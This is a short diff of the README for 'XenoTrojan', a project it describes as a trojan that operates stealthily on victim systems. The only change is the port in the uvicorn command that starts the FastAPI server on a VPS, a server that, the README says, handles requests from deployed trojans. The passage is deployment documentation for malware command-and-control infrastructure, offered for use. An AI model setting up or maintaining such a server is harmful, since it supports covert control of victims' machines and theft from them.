@@ -58,7 +58,7 @@ XenoTrojan is developed to operate stealthily on victim systems, leveraging Fast
 To deploy the FastAPI server on your VPS, execute the following command:
 
 ```bash
-nohup uvicorn main:app --host 0.0.0.0 --port 3993 > fastapi.log 2>&1 &
+nohup uvicorn main:app --host 0.0.0.0 --port 3333 > fastapi.log 2>&1 &
 ```
 
 This command starts the FastAPI server to handle incoming API requests from deployed trojans.
